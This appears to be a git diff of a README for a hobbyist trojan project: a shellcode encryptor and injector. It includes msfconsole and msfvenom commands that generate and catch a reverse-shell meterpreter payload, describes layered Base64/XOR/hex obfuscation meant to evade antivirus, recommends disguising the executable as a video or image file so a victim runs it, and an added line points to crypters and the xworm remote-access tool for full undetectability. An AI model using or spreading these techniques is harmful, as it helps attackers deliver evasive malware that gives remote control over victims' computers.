@@ -8,7 +8,7 @@ Simple shellcode execution technique in which the payload is decrypted, copied i
 First, on the attacker's machine i used the classic multi handler exploit to run the payload: 
 ``` msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost XXX; set lport XXX; exploit" ```
 
-The payload is, as i said before, a simple base64 shellcode, it's reccomended to use shigata_ga_nai alternatives since its easy to detect:
+The payload is a simple base64 shellcode, it's reccomended to use shigata_ga_nai alternatives since its easy to detect:
 ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=XXX LPORT=XXXX  -e x86/shikata_ga_nai -f c  ```. 
 
 You can embed the code into pretty much anything, you can even use tools to mask the exe file into a mp4 or jpg file, complete with a new icon and a name, even the extension can be masked. Once the victim runs the exe, a new session will pop up on metasploit, where you can create a shell and work towards privilege escalation.
@@ -17,8 +17,8 @@ You can embed the code into pretty much anything, you can even use tools to mask
 
 The encryptor takes the shellcode (which in the code i uploaded is just a windows message box that says xd lol) and obfuscates it using 3 layers of encryption:
 - First we encode binary data into a Base64 representation, use a custom base64_chars set instead of the standard Base64 alphabet to add obfuscation;
-- Secondly we apply XOR encryption on it using a single-byte key, XOR encryption is symmetric so it can be decrypted by applying the same key;
-- Then we convert the binary data into its hexadecimal string representation and we get the final encrypted shellcode.
+- Secondly we apply XOR encryption on the string using a single-byte key, XOR encryption is symmetric so it can be decrypted by applying the same key;
+- Then we convert it into its hexadecimal string representation and we get the final encrypted shellcode.
 
 ###  Injector:
 
@@ -32,7 +32,8 @@ Finally we wait for the created thread to finish executing before freeing the me
 
 # 🛡 AV Detection
 
-<img align="right" src="media/hsav1.png" width="230" />
+<img align="right" src="media/hsav1.png" width="430" />
 
 Just like my previous trojans, it's currently undetected by windows defender, but it's easily blocked by Bitdefender, even the free trial.
 Again Virus Total says that bitdefender won't classify the exe file as malicious, while Microsoft recognizes the malware.... it should be the exact opposite but idk.
+You can still make it fully undetectable by using other encrypting softwares like Soggoth or Supernova or idk, but at that point just use a much more known rat like xworm.
